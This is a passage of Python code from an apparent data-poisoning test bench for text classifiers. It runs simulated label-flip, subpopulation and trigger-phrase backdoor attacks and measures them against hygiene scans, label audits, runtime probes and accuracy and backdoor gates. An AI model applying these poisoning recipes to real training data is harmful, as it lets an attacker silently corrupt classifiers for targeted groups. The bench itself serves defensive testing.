                pts.append({"rate": r, "rows": nn, "asr": round(asr, 4), "acc": round(self._accuracy(m), 4)})
                if broke is None and asr >= 0.5:
                    broke = r
            peak = max((p["asr"] for p in pts), default=0.0)
            cbase = float(np.mean(np.asarray([str(p) for p in self.clean_model.predict(tt)]) == ctarget)) if tt is not None else 0.0
            findings.append({
                "attack": "composite", "target": ctarget, "trigger": comp, "trigger_raw": comp,
                "points": pts, "baseline_asr": round(cbase, 4), "breaks_at_rate": broke,
                "peak": round(peak, 4), "severity": sev(broke, "medium" if peak >= 0.3 else "low"),
            })

        # Subpopulation susceptibility (one representative slice): relabel only a keyword-defined
        # slice of one source class. Global accuracy barely moves while that subgroup's verdict is
        # turned, so only a worst-group metric sees it.
        allpreds = np.asarray([str(p) for p in self.clean_model.predict(self.test_df[tx].fillna("").astype(str))])
        for source in list(base[lb].astype(str).value_counts().index)[:3]:
            kw = self.auto_subgroup(source)
            if not kw:
                continue
            starget = next((str(c) for c in base[lb].astype(str).value_counts().index if str(c) != str(source)), None)
            if starget is None:
                continue
            kwl = kw.lower()
            tr_mask = base[tx].fillna("").astype(str).str.lower().str.contains(_re.escape(kwl), regex=True).to_numpy()
            idx = base.index[(base[lb].astype(str) == str(source)) & tr_mask].to_numpy()
            gmask = ((self.test_df[lb].astype(str) == str(source)).to_numpy()
                     & self.test_df[tx].fillna("").astype(str).str.lower().str.contains(_re.escape(kwl), regex=True).to_numpy())
            if len(idx) < 3 or int(gmask.sum()) < 2:
                continue
            base_recall = float(np.mean(allpreds[gmask] == str(source)))
            spts, worst = [], base_recall
            for frac in [0.4, 0.7, 1.0]:
                k = max(1, round(frac * len(idx)))
                work = base.copy(); work.loc[idx[:k], lb] = starget
                m = self._fit(work)
                pred = np.asarray([str(p) for p in m.predict(self.test_df[tx].fillna("").astype(str))])
                spts.append({"rate": round(k / n_train, 4), "rows": k,
                             "recall": round(float(np.mean(pred[gmask] == str(source))), 4),
                             "transition": round(float(np.mean(pred[gmask] == starget)), 4),
                             "acc": round(self._accuracy(m), 4)})
                worst = min(worst, spts[-1]["recall"])
            drop = base_recall - worst
            findings.append({
                "attack": "subpopulation", "source": str(source), "target": starget,
                "subgroup": kw, "subgroup_kind": "keyword", "points": spts,
                "worst_recall": round(worst, 4), "breaks_at_rate": None,
                "severity": "high" if drop >= 0.5 else ("medium" if drop >= 0.25 else "low"),
            })
            break  # one representative subpopulation finding is enough

        # Availability susceptibility: broad random label noise. The LOUD attack: it dents global
        # accuracy, so an accuracy gate catches it. Included as the contrast/baseline, ranked low.
        aidx = np.random.default_rng(seed).permutation(list(base.index))
        arng = np.random.default_rng(seed + 1)
        ytest = self.test_df[lb].astype(str).to_numpy()
        xtest = self.test_df[tx].fillna("").astype(str)
        apts = []
        for r in [0.05, 0.1, 0.2, 0.3]:
            k = min(len(aidx), max(1, round(r * n_train)))
            work = base.copy()
            for i in aidx[:k]:
                cur = str(work.at[i, lb]); opts = [l for l in self.labels if l != cur]
                if opts:
                    work.at[i, lb] = opts[int(arng.integers(len(opts)))]
            m = self._fit(work)
            pred = np.asarray([str(p) for p in m.predict(xtest)])
            recs = [float(np.mean(pred[ytest == l] == l)) for l in self.labels if int((ytest == l).sum())]
            apts.append({"rate": round(k / n_train, 4), "rows": k,
                         "recall": round(min(recs) if recs else 1.0, 4), "acc": round(self._accuracy(m), 4)})
        findings.append({
            "attack": "availability", "points": apts, "breaks_at_rate": None,
            "worst_recall": round(min((p["recall"] for p in apts), default=1.0), 4), "severity": "low",
        })

        findings.sort(key=lambda f: (rank[f["severity"]], f["breaks_at_rate"] if f["breaks_at_rate"] else 1.0))
        result = {
            "baseline_accuracy": round(self.baseline_accuracy, 4),
            "train_size": int(len(self.train_df)), "scanned_size": n_train, "rates": rates,
            "findings": findings, "weakest": findings[0] if findings else None,
            "item": self.item_noun, "items": self.item_plural, "labels": self.labels,
            "project": self.project,
        }
        self._scan_cache = result  # let the collective guardrail reuse this without re-sweeping
        return result

    def hygiene_scan(self) -> dict[str, Any]:
        """Static, no-training dataset-hygiene scan of the *current* corpus (training set
        plus any injected poison). Two families of checks: hidden/deceptive Unicode
        (precise, low false-positive) and rare-token-vs-label correlation (a noisy
        heuristic that catches distinctive triggers but drowns in natural class words on
        real data). Findings are tiered so the report stays quiet on benign Unicode."""
        import math
        from collections import Counter, defaultdict

        texts = list(self.train_df[self.text_column].fillna("").astype(str))
        labels = list(self.train_df[self.label_column].astype(str))
        for r in self.injected:
            texts.append(str(r["text"]))
            labels.append(str(r["label"]))
        n = len(texts)

        def esc(t: str) -> str:
            s = "".join(c if 32 <= ord(c) < 127 else "\\u%04x" % ord(c) for c in t)
            return s[:140]

        sec_rows: set[int] = set()
        sec_kinds: Counter = Counter()
        qual_kinds: Counter = Counter()
        qual_count = 0
        benign_count = 0
        sec_examples: list[dict[str, Any]] = []
        qual_examples: list[dict[str, Any]] = []
        for i, t in enumerate(texts):
            findings = classify_unicode(t)
            sec = [f for f in findings if f[0] == "security"]
            qual = [f for f in findings if f[0] == "quality"]
            if any(f[0] == "benign" for f in findings):
                benign_count += 1
            if sec:
                sec_rows.add(i)
                for _, k, _ in sec:
                    sec_kinds[k] += 1
                if len(sec_examples) < 10:
                    sec_examples.append({"row": i, "label": labels[i],
                                         "kinds": sorted({k for _, k, _ in sec}),
                                         "detail": sec[0][2], "rendered": t[:100], "escaped": esc(t)})
            elif qual:
                qual_count += 1
                for _, k, _ in qual:
                    qual_kinds[k] += 1
                if len(qual_examples) < 6:
                    qual_examples.append({"row": i, "label": labels[i],
                                          "kinds": sorted({k for _, k, _ in qual}), "escaped": esc(t)})

        analyzer = self.clean_model.named_steps["tfidfvectorizer"].build_analyzer()
        tok_docs: dict[str, set] = defaultdict(set)
        tok_lab: dict[str, Counter] = defaultdict(Counter)
        for i, t in enumerate(texts):
            for tk in {x for x in analyzer(t) if " " not in x}:
                tok_docs[tk].add(i)
                tok_lab[tk][labels[i]] += 1
        rare_max = max(8, int(0.02 * n))
        suspicious: list[dict[str, Any]] = []
        for tk, docs in tok_docs.items():
            df = len(docs)
            if df < 4 or df > rare_max:
                continue
            top_label, cnt = tok_lab[tk].most_common(1)[0]
            conc = cnt / df
            if conc < 0.95:
                continue
            # a token is unicode-linked if it is itself non-ASCII (homoglyph), or it lives
            # predominantly in rows that carry hidden Unicode (zero-width fragments), not
            # merely co-occurring once (that would catch innocent carrier words).
            uni = any(ord(c) > 127 for c in tk) or (len(docs & sec_rows) >= 0.5 * df)
            score = conc * math.log(df + 1) * (2.5 if uni else 1.0)
            suspicious.append({"token": tk, "escaped": esc(tk), "df": df,
                               "concentration": round(conc, 3), "label": top_label,
                               "unicode": uni, "score": round(score, 3)})
        suspicious.sort(key=lambda s: -s["score"])
        uni_flagged = sum(1 for s in suspicious if s["unicode"])

        # Repeated multi-word phrase detection. The single-token scan above is blind to a
        # backdoor whose trigger is a *phrase* of common words (a style/register backdoor's
        # fixed closer, a boilerplate suffix). Natural short text rarely repeats a 4-5 word
        # span across many rows, so a label-concentrated repeated n-gram is a strong poison
        # signal. This is the check that catches the constant-phrase confound in our own
        # style backdoor: no rare or non-ASCII token, but a phrase planted verbatim.
        phrase_docs: dict[tuple, set] = defaultdict(set)
        phrase_lab: dict[tuple, Counter] = defaultdict(Counter)
        word_docs: dict[str, set] = defaultdict(set)
        word_lab: dict[str, Counter] = defaultdict(Counter)
        for i, t in enumerate(texts):
            words = _re.findall(r"[a-z0-9']+", t.lower())
            for w in set(words):
                word_docs[w].add(i)
                word_lab[w][labels[i]] += 1
            # 2-grams for the composite-pair check; 4-5-grams for the constant-phrase check.
            grams = {tuple(words[j:j + gl]) for gl in (2, 4, 5) for j in range(len(words) - gl + 1)}
            for g in grams:
                phrase_docs[g].add(i)
                phrase_lab[g][labels[i]] += 1
        phrase_min = max(4, int(0.01 * n))

        def _word_conc(w: str) -> float:
            d = word_docs.get(w)
            return (word_lab[w].most_common(1)[0][1] / len(d)) if d else 1.0

        raw_phrases: list[dict[str, Any]] = []
        for g, docs in phrase_docs.items():
            df = len(docs)
            if df < phrase_min:
                continue
            top_label, cnt = phrase_lab[g].most_common(1)[0]
            conc = cnt / df
            if conc < 0.95:
                continue
            if len(g) == 2:
                # Composite-pair CANDIDATE: a label-locked bigram of two real words (alphabetic,
                # >=3 chars, skipping syntax noise like 'n'/'0') where each word is individually
                # label-neutral. That is the composite signature (two innocent words, locked pair),
                # and it skips natural class vocabulary like "git commit" (a word is class-specific).
                # Best-effort only: a composite whose words already lean a class slips this (the
                # behavioral canary is the reliable catch), and natural collocations can still show
                # up, so these are candidates, not proof.
                if not (g[0].isalpha() and g[1].isalpha() and len(g[0]) >= 3 and len(g[1]) >= 3):
                    continue
                if _word_conc(g[0]) >= 0.8 or _word_conc(g[1]) >= 0.8:
                    continue
                raw_phrases.append({"phrase": " ".join(g), "df": df, "concentration": round(conc, 3),
                                    "label": top_label, "kind": "composite",
                                    "score": round(conc * math.log(df + 1) * 1.1, 3)})
            else:
                raw_phrases.append({"phrase": " ".join(g), "df": df, "concentration": round(conc, 3),
                                    "label": top_label, "kind": "phrase",
                                    "score": round(conc * math.log(df + 1), 3)})
        # Collapse overlapping sub-grams (a 5-gram and the 4-gram inside it): keep the
        # highest-scoring representative, drop phrases contained in an already-kept one.
        raw_phrases.sort(key=lambda p: (-p["score"], -len(p["phrase"])))
        phrases: list[dict[str, Any]] = []
        ncomp = 0
        for p in raw_phrases:
            if any(p["kind"] == k["kind"] and (p["phrase"] in k["phrase"] or k["phrase"] in p["phrase"])
                   for k in phrases):
                continue
            if p["kind"] == "composite":
                if ncomp >= 4:  # bound the best-effort composite candidates; keep room for phrases
                    continue
                ncomp += 1
            phrases.append(p)
            if len(phrases) >= 8:
                break

        return {
            "n_rows": n,
            "security": {"count": len(sec_rows), "kinds": dict(sec_kinds), "rows": sec_examples},
            "quality": {"count": qual_count, "kinds": dict(qual_kinds), "rows": qual_examples},
            "benign_count": benign_count,
            "suspicious": {"total": len(suspicious), "unicode_flagged": uni_flagged, "top": suspicious[:12]},
            "phrases": {"total": len(phrases), "top": phrases},
            "items": self.item_plural,
        }

    def label_audit(self, margin: float = 0.2, max_flag: int = 40) -> dict[str, Any]:
        """L2 model audit (confident learning). Fit the model out-of-fold and flag rows
        whose given label the model confidently disagrees with: likely label errors.

        Because we know exactly which rows this session poisoned, we report the auditor's
        real precision and recall, honestly. It catches SCATTERED label noise (random
        availability, targeted flips) but is blind to poison that is internally consistent
        enough for the model to learn it (a subpopulation, a token backdoor) and to
        clean-label / style attacks whose labels are correct: those need the canary."""
        from sklearn.model_selection import cross_val_predict

        flip_based = self.attack_type in ("targeted-flip", "subpopulation", "availability")
        if flip_based:
            work = self._work
            poison_idx = {int(i) for i in self._flipped}
        else:
            adds = pd.DataFrame(
                [{self.text_column: r["text"], self.label_column: r["label"]} for r in self.injected]
            )
            work = pd.concat([self.train_df, adds], ignore_index=True) if len(self.injected) else self.train_df
            poison_idx = set(range(len(self.train_df), len(self.train_df) + len(self.injected)))
        work = work.reset_index(drop=True)

        x = work[self.text_column].fillna("").astype(str)
        y = work[self.label_column].astype(str).to_numpy()
        pipe = make_pipeline(
            TfidfVectorizer(ngram_range=(1, 2), min_df=1),
            LogisticRegression(max_iter=1000, random_state=42),
        )
        proba = cross_val_predict(pipe, x, y, cv=5, method="predict_proba")
        classes = np.array(sorted(pd.unique(y)))
        gi = {c: i for i, c in enumerate(classes)}
        given = np.array([proba[k, gi[y[k]]] for k in range(len(y))])
        pred = classes[proba.argmax(1)]
        pmax = proba.max(1)
        margins = pmax - given
        flag = (pred != y) & (margins > float(margin))
        idxs = np.where(flag)[0]
        order = idxs[np.argsort(-margins[idxs])]

        rows = []
        for k in order[:max_flag]:
            rows.append({
                "row": int(k),
                "text": str(work.at[int(k), self.text_column])[:120],
                "given": str(y[k]), "predicted": str(pred[k]),
                "confidence": round(float(pmax[k]), 3), "margin": round(float(margins[k]), 3),
                "is_poison": int(k) in poison_idx,
            })
        flagged = {int(i) for i in idxs}
        tp = len(flagged & poison_idx)
        return {
            "attack": self.attack_type,
            "flagged_count": len(flagged),
            "poison_count": len(poison_idx),
            "caught": tp,
            "precision": round(tp / len(flagged), 3) if flagged else None,
            "recall": round(tp / len(poison_idx), 3) if poison_idx else None,
            "rows": rows,
            "margin": float(margin),
            "items": self.item_plural,
        }

    def _poisoned_frame(self):
        """The current training set as the model sees it: in-place flips (self._work)
        or the base set plus appended rows. Returns (df, set_of_poison_row_indices)."""
        if self.attack_type in ("targeted-flip", "subpopulation", "availability"):
            return self._work.reset_index(drop=True), {int(i) for i in self._flipped}
        if self.injected:
            adds = pd.DataFrame(
                [{self.text_column: r["text"], self.label_column: r["label"]} for r in self.injected]
            )
            df = pd.concat([self.train_df, adds], ignore_index=True)
            return df, set(range(len(self.train_df), len(self.train_df) + len(self.injected)))
        return self.train_df.reset_index(drop=True), set()

    @staticmethod
    def embed_backend() -> dict[str, Any]:
        """Which embedding backend the kNN audit uses. Defaults to TF-IDF cosine so the
        demo stays CPU-pure and dependency-free; sentence-transformers, if installed, is
        the semantic upgrade that would also reach paraphrase/style neighbourhoods."""
        import importlib.util

        st = importlib.util.find_spec("sentence_transformers") is not None
        return {"name": "TF-IDF cosine", "st_available": st}

    def knn_audit(self, n_neighbors: int = 10, threshold: float = 0.6, max_flag: int = 40) -> dict[str, Any]:
        """L2 audit by nearest neighbours: flag rows whose given label disagrees with the
        labels of their closest neighbours in embedding space. This LOCAL view catches
        poison that the GLOBAL confident-learning view misses, notably a subpopulation
        flip, because a row's text-neighbours still carry the honest label even after the
        model has learned the planted pattern. Still blind to clean-label / style / token
        backdoors, whose poison sits in a consistent neighbourhood of its own."""
        from sklearn.neighbors import NearestNeighbors

        work, poison_idx = self._poisoned_frame()
        y = work[self.label_column].astype(str).to_numpy()
        matrix = TfidfVectorizer(ngram_range=(1, 2), min_df=1).fit_transform(
            work[self.text_column].fillna("").astype(str)
        )
        nn = NearestNeighbors(n_neighbors=min(n_neighbors + 1, len(work)), metric="cosine").fit(matrix)
        _, idx = nn.kneighbors(matrix)

        rows, flagged = [], set()
        for i in range(len(y)):
            neigh = idx[i][1:]  # drop self
            if len(neigh) == 0:
                continue
            nb_labels = y[neigh]
            dis = float(np.mean(nb_labels != y[i]))
            if dis >= float(threshold):
                flagged.add(i)
                vals, counts = np.unique(nb_labels, return_counts=True)
                rows.append({
                    "row": int(i),
                    "text": str(work.at[i, self.text_column])[:120],
                    "given": str(y[i]),
                    "neighbor_majority": str(vals[counts.argmax()]),
                    "disagreement": round(dis, 2),
                    "is_poison": int(i) in poison_idx,
                })
        rows.sort(key=lambda r: -r["disagreement"])
        tp = len(flagged & poison_idx)
        return {
            "backend": self.embed_backend()["name"],
            "st_available": self.embed_backend()["st_available"],
            "flagged_count": len(flagged),
            "poison_count": len(poison_idx),
            "caught": tp,
            "precision": round(tp / len(flagged), 3) if flagged else None,
            "recall": round(tp / len(poison_idx), 3) if poison_idx else None,
            "rows": rows[:max_flag],
            "items": self.item_plural,
        }

    def _target_zone_mask(self) -> np.ndarray:
        """Test rows the attack is *supposed* to move (its target zone). Anything outside
        it is collateral: damage the attacker did not intend."""
        y = self.test_df[self.label_column].astype(str).to_numpy()
        if self.attack_type == "subpopulation" and self.subgroup:
            return self._subgroup_mask(self.test_df[self.text_column]).to_numpy()
        if self.attack_type in ("targeted-flip",) and self.source_label:
            return y == self.source_label
        if self.attack_type == "availability":
            return np.ones(len(y), dtype=bool)  # no specific target: all of it is fair game
        # backdoor / clean-label / style / composite: the trigger is not in clean rows,
        # so the whole clean test set is the collateral zone.
        return np.zeros(len(y), dtype=bool)

    def attack_metrics(self) -> dict[str, Any]:
        """Metrics beyond the two headline numbers: per-class F1, attack-success per 1%
        of poison (efficiency), collateral damage outside the target, and a stealth score
        (how little a global-accuracy dashboard would notice)."""
        from sklearn.metrics import f1_score

        xte = self.test_df[self.text_column].fillna("").astype(str)
        yte = self.test_df[self.label_column].astype(str).to_numpy()
        pred = np.asarray([str(p) for p in self.poisoned_model.predict(xte)])
        clean_pred = np.asarray([str(p) for p in self.clean_model.predict(xte)])

        per_class = []
        for lbl in self.labels:
            per_class.append({
                "label": lbl,
                "f1": round(float(f1_score(yte == lbl, pred == lbl, zero_division=0)), 4),
                "baseline_f1": round(float(f1_score(yte == lbl, clean_pred == lbl, zero_division=0)), 4),
            })

        lift = self.attack_success(self.poisoned_model) - float(self.baseline_success or 0.0)
        n = len(self.injected)
        flip_based = self.attack_type in ("targeted-flip", "subpopulation", "availability")
        denom = len(self.train_df) if flip_based else (len(self.train_df) + n)
        pct = (n / denom * 100) if denom else 0.0
        asr_per_pct = round(lift / pct, 4) if pct > 0 else None

        # Collateral: accuracy the attack cost outside its intended zone.
        outside = ~self._target_zone_mask()
        if int(outside.sum()):
            clean_out = float(np.mean(clean_pred[outside] == yte[outside]))
            pois_out = float(np.mean(pred[outside] == yte[outside]))
            collateral = round(clean_out - pois_out, 4)
        else:
            collateral = 0.0

        global_drop = self.baseline_accuracy - self._accuracy(self.poisoned_model)
        stealth = round(max(0.0, 1.0 - max(0.0, global_drop) / 0.10), 3)  # 10pt drop -> 0

        return {
            "per_class": per_class,
            "asr_per_pct": asr_per_pct,
            "poison_pct": round(pct, 3),
            "collateral": collateral,
            "stealth": stealth,
            "injected_count": n,
            "attack": self.attack_type,
        }

    def remediate(self, stage: str) -> dict[str, Any]:
        """Self-contained remediation-loop demo: clean -> poison -> audit -> fixed.

        Computes the CI-gate verdict (accuracy + backdoor ASR against the SAME thresholds
        `build_canary` / `unrelabel check` use) at each stage on a fresh model, WITHOUT
        touching the live bench injection, so the walkthrough always tells the same story.
        Trigger-based backdoors only (the loop the hate-speech demo shows)."""
        from unrelabel.harden import ACCURACY_MARGIN, ASR_MARGIN

        tx, lb = self.text_column, self.label_column
        trig_based = self.attack_type in ("backdoor", "clean-label", "composite") and bool(self.trigger)
        base_acc = float(self.baseline_accuracy)
        base_asr = float(self.baseline_success or 0.0)
        out: dict[str, Any] = {
            "stage": stage, "supported": trig_based, "trigger": self.trigger,
            "target_label": self.target_label, "baseline_accuracy": round(base_acc, 4),
            "baseline_asr": round(base_asr, 4), "acc_threshold": round(base_acc - ACCURACY_MARGIN, 4),
            "asr_threshold": round(min(0.95, base_asr + ASR_MARGIN), 4),
        }
        if not trig_based:
            return out
        # Genuine source-class rows carrying the trigger, relabeled to the target: the honest
        # dirty-label backdoor. Pick the SMALLEST budget that actually breaks the gate (from a
        # small ladder), so the "someone poisons it" step reliably fails even on a hard target: a
        # strong backdoor bites at ~1%, a long-email phishing one needs ~2-3%. Floored so a small
        # uploaded corpus still breaks, and never more than the available source pool.
        if self.source_label:
            src = self.train_df[self.train_df[lb].astype(str) == self.source_label]
        else:
            src = self.train_df[self.train_df[lb].astype(str) != self.target_label]
        pool = [s for s in src[tx].dropna().astype(str).tolist() if s.strip()] or [""]
        ntr = max(1, len(self.train_df))

        def _mk_poison(rate):
            k = min(max(round(rate * ntr), 15), len(pool))
            return k, pd.DataFrame([{tx: place_trigger(c, self.trigger, self.trigger_place),
                                     lb: self.target_label} for c in pool[:k]])

        if stage in ("clean", "fixed"):
            n, poison = _mk_poison(0.01)  # nominal; clean/fixed score on the clean model
            model = self.clean_model
        else:
            n, poison, model = None, None, None
            for rate in (0.01, 0.02, 0.03, 0.05, 0.08):
                n, poison = _mk_poison(rate)
                model = self._fit(pd.concat([self.train_df, poison], ignore_index=True))
                if float(self._asr(model)) > out["asr_threshold"]:
                    break  # smallest budget that trips the gate
        out["n_poison"], out["poison_rate"] = int(n), round(n / ntr, 4)
        acc, asr = self._accuracy(model), self._asr(model)
        out["accuracy"], out["asr"] = round(acc, 4), round(asr, 4)
        out["accuracy_pass"] = acc >= out["acc_threshold"]
        out["backdoor_pass"] = asr <= out["asr_threshold"]
        out["gate_pass"] = out["accuracy_pass"] and out["backdoor_pass"]
        if stage == "audit":
            # The L1 hygiene tell: the trigger phrase's document frequency and how one-sidedly
            # its rows are labeled. Natural class vocabulary is never this concentrated.
            key = str(self.trigger).strip().lower()
            full = pd.concat([self.train_df, poison], ignore_index=True)
            col = full[tx].fillna("").astype(str).str.lower()
            hit = full[col.str.contains(_re.escape(key), regex=True)]
            labs = hit[lb].astype(str).value_counts()
            out["audit"] = {
                "token": self.trigger, "rows": int(len(hit)),
                "concentration": round(float(labs.iloc[0] / len(hit)), 3) if len(hit) else 0.0,
                "label": str(labs.index[0]) if len(labs) else self.target_label,
                "examples": [{"text": str(r[tx])[:130], "label": str(r[lb])}
                             for _, r in poison.head(3).iterrows()],
            }
        return out

    def _accuracy(self, model) -> float:
        preds = model.predict(self.test_df[self.text_column].fillna("").astype(str))
        return float(accuracy_score(self.test_df[self.label_column].astype(str), preds))

    def _asr(self, model) -> float:
        if self._triggered_df is None or len(self._triggered_df) == 0:
            return 0.0
        preds = model.predict(self._triggered_df[self.text_column].fillna("").astype(str))
        return float(np.mean(np.asarray([str(p) for p in preds]) == self.target_label))

    def _styled_test(self, test_df: pd.DataFrame) -> pd.DataFrame:
        """Behavioral probe for the style backdoor: source (or non-target) test rows
        rewritten into the register. Subsampled because rewriting is the only cost;
        the rewrite is a pure function of the text, so it matches the training poison
        byte-for-byte and the measured ASR is meaningful."""
        tx, lb = self.text_column, self.label_column
        if self.source_label is not None:
            rows = test_df[test_df[lb].astype(str) == self.source_label].copy()
        else:
            rows = test_df[test_df[lb].astype(str) != self.target_label].copy()
        if len(rows) > 300:
            rows = rows.sample(300, random_state=0)
        rows = rows.reset_index(drop=True)
        rows[tx] = rows[tx].fillna("").astype(str).map(lambda t: rewrite_style(t, self.style, self.style_closer))
        return rows

    def _carrier(self, text: str) -> str:
        """The poison-carrier form of a text for the current attack: the register
        rewrite for a style backdoor, the token stamp otherwise."""
        if self.attack_type == "style":
            return rewrite_style(text, self.style, self.style_closer)
        return place_trigger(text, self.trigger, self.trigger_place)

    def _subgroup_mask(self, series: pd.Series) -> pd.Series:
        """Boolean mask of rows in the targeted slice: a keyword match, or membership in
        a chosen semantic cluster."""
        if self.subgroup_kind == "cluster" and self.subgroup_cluster is not None:
            vec, km, _ = self._clusters()
            preds = km.predict(vec.transform(series.fillna("").astype(str)))
            return pd.Series(preds == int(self.subgroup_cluster), index=series.index)
        kw = (self.subgroup or "").strip()
        if not kw:
            return pd.Series(False, index=series.index)
        return series.fillna("").astype(str).str.contains(_re.escape(kw), case=False, regex=True)

    def _clusters(self, k: int = 8):
        """Fit (and cache) a KMeans over the training text, for semantic subgroup slices."""
        if self._cluster_cache is None:
            from sklearn.cluster import KMeans

            k = max(2, min(k, max(2, len(self.train_df) // 20)))
            vec = TfidfVectorizer(ngram_range=(1, 2), min_df=2)
            matrix = vec.fit_transform(self.train_df[self.text_column].fillna("").astype(str))
            km = KMeans(n_clusters=k, random_state=0, n_init=10).fit(matrix)
            self._cluster_cache = (vec, km, k)
        return self._cluster_cache

    def cluster_scan(self) -> dict[str, Any]:
        """Discover the semantic subgroups in the data and rank them by how attackable they
        are: for each cluster, its size, defining terms, clean accuracy, and how far that
        accuracy falls if an attacker flips the cluster's source-class rows. Surfaces the
        soft underbelly an attacker would target without ever naming a keyword."""
        vec, km, k = self._clusters()
        terms = np.array(vec.get_feature_names_out())
        train_c = km.predict(vec.transform(self.train_df[self.text_column].fillna("").astype(str)))
        test_texts = self.test_df[self.text_column].fillna("").astype(str)
        test_c = km.predict(vec.transform(test_texts))
        ytest = self.test_df[self.label_column].astype(str).to_numpy()
        clean_pred = np.asarray([str(p) for p in self.clean_model.predict(test_texts)])
        target = self.target_label
        source = self.source_label or next((l for l in self.labels if l != target), self.labels[0])

        clusters = []
        for c in range(k):
            top = terms[km.cluster_centers_[c].argsort()[-3:][::-1]]
            test_mask = test_c == c
            train_src = self.train_df.index[(train_c == c) & (self.train_df[self.label_column].astype(str) == source).to_numpy()]
            clean_acc = float(np.mean(clean_pred[test_mask] == ytest[test_mask])) if int(test_mask.sum()) else None
            # worst-case: flip this cluster's source rows, remeasure the cluster's accuracy
            worst = None
            if len(train_src) >= 2 and int(test_mask.sum()):
                work = self.train_df.copy()
                work.loc[train_src, self.label_column] = target
                m = self._fit(work)
                cp = np.asarray([str(p) for p in m.predict(test_texts[test_mask])])
                worst = float(np.mean(cp == ytest[test_mask]))
            clusters.append({
                "id": c,
                "terms": [str(t) for t in top],
                "train_size": int((train_c == c).sum()),
                "test_size": int(test_mask.sum()),
                "flippable": int(len(train_src)),
                "clean_accuracy": round(clean_acc, 4) if clean_acc is not None else None,
                "worst_accuracy": round(worst, 4) if worst is not None else None,
                "drop": round(clean_acc - worst, 4) if (clean_acc is not None and worst is not None) else None,
            })
        clusters.sort(key=lambda c: -(c["drop"] or 0))
        return {"clusters": clusters, "source_label": source, "target_label": target,
                "global_accuracy": round(self.baseline_accuracy, 4), "items": self.item_plural}

    def worst_group_accuracy(self, model) -> float | None:
        """Accuracy on the targeted subgroup (test rows matching the keyword). This is
        the number a single global-accuracy figure hides during a subpopulation attack."""
        if not self.subgroup:
            return None
        mask = self._subgroup_mask(self.test_df[self.text_column]).to_numpy()
        if not mask.any():
            return None
        x = self.test_df[self.text_column].fillna("").astype(str).to_numpy()[mask]
        y = self.test_df[self.label_column].astype(str).to_numpy()[mask]
        preds = np.asarray([str(p) for p in model.predict(list(x))])
        return float(np.mean(preds == y))

    def _common_vocab(self, min_docs: int = 5) -> set[str]:
        """Trusted token set for the rare-token runtime probe: alphabetic tokens that
        appear in at least `min_docs` clean training documents. Cached."""
        if self._common_vocab_cache is None:
            from collections import Counter
            df: Counter = Counter()
            for doc in self.train_df[self.text_column].fillna("").astype(str):
                for w in set(_re.findall(r"[A-Za-z][A-Za-z]+", doc.lower())):
                    df[w] += 1
            self._common_vocab_cache = {w for w, c in df.items() if c >= min_docs}
        return self._common_vocab_cache

    def runtime_probe(self, ops) -> dict[str, Any]:
        """L4 runtime defense. For the currently configured attack, re-predict every
        probe input in a normalized form and flag any whose verdict changes: a hidden
        trigger's effect vanishes under normalization, so a flipped verdict is the
        tell. Report the catch rate on inputs the attack actually flips and the
        false-positive rate on clean inputs, so the trade-off is honest.

        This is the natural pair to the Unicode backdoor (normalization strips the
        homoglyph / zero-width trigger) and to the rare-phrase backdoor (token
        removal drops it), and it is expected to MISS the style and label-flip
        attacks, whose inputs are natural, exactly the point of the behavioral canary.
        """
        ops = set(ops or ())
        tx = self.text_column
        common = self._common_vocab() if "rare_token" in ops else None

        def predict(texts):
            if not texts:
                return []
            return [str(p) for p in self.poisoned_model.predict(texts)]

        result = {"ops": sorted(ops), "attack": self.attack_type,
                  "catch_rate": None, "fp_rate": None, "n_caught": 0, "n_flipped": 0, "n_clean": 0}
        if not ops:
            return result

        # Catch rate: among probe inputs the poisoned model sends to the target,
        # how many revert once normalized.
        if self._triggered_df is not None and len(self._triggered_df):
            trig = self._triggered_df[tx].fillna("").astype(str).tolist()
            orig = predict(trig)
            normed = predict([normalize_text(s, ops, common) for s in trig])
            flipped = [i for i, o in enumerate(orig) if o == self.target_label]
            caught = sum(1 for i in flipped if normed[i] != self.target_label)
            result["n_flipped"] = len(flipped)
            result["n_caught"] = caught
            result["catch_rate"] = round(caught / len(flipped), 4) if flipped else None

        # False positives: clean inputs whose verdict normalization would disturb.
        clean = self.test_df[tx].fillna("").astype(str)
        if len(clean) > 300:
            clean = clean.sample(300, random_state=0)
        clean = clean.tolist()
        co = predict(clean)
        cn = predict([normalize_text(s, ops, common) for s in clean])
        fp = sum(1 for a, b in zip(co, cn) if a != b)
        result["n_clean"] = len(clean)
        result["fp_rate"] = round(fp / len(clean), 4) if clean else 0.0
        return result

    def attack_success(self, model) -> float:
        """Backdoor / clean-label: trigger attack-success-rate. Targeted-flip: fraction
        of clean source-class test examples the model now predicts as the target class."""
        if self.attack_type in ("backdoor", "clean-label", "style", "composite"):
            return self._asr(model)
        if self.attack_type == "availability":
            # No directed target: the "success" is how low the worst class is driven.
            return round(1.0 - self.worst_class_recall(model), 4)
        if not self.source_label:
            return 0.0
        mask = (self.test_df[self.label_column].astype(str) == self.source_label).to_numpy()
        if self.attack_type == "subpopulation":
            # Success is measured only inside the targeted slice.
            mask = mask & self._subgroup_mask(self.test_df[self.text_column]).to_numpy()
        if int(mask.sum()) == 0:
            return 0.0
        preds = np.asarray([str(p) for p in model.predict(self.test_df[self.text_column].fillna("").astype(str))])
        return float(np.mean(preds[mask] == self.target_label))

    def check(self) -> dict[str, Any]:
        """Run the pre-ship gates against the current (poisoned) model."""
        from unrelabel.harden import ACCURACY_MARGIN, ASR_MARGIN

        invariants: list[dict[str, Any]] = []
        acc = self._accuracy(self.poisoned_model)
        acc_threshold = round(self.baseline_accuracy - ACCURACY_MARGIN, 4)
        invariants.append({
            "id": "accuracy-gate",
            "label": "Accuracy gate",
            "detail": "overall accuracy stays within margin of baseline",
            "measured": round(acc, 4),
            "threshold": acc_threshold,
            "higher_is_worse": False,
            "passed": acc >= acc_threshold,
        })
        if self.source_label or self.trigger or self.attack_type == "style":
            succ = self.attack_success(self.poisoned_model)
            threshold = round(min(0.95, self.baseline_success + ASR_MARGIN), 4)
            if self.attack_type == "style":
                detail = f"the {self.style} register must not flip “{self.source_label or 'source'}” {self.item_plural} to “{self.target_label}”"
            elif self.attack_type == "subpopulation":
                detail = f"“{self.source_label}” {self.item_plural} mentioning “{self.subgroup}” must rarely be predicted “{self.target_label}”"
            elif self.attack_type == "composite":
                detail = f"the co-occurrence trigger “{self.trigger}” must not flip “{self.source_label or 'source'}” to “{self.target_label}”"
            elif self.attack_type in ("backdoor", "clean-label"):
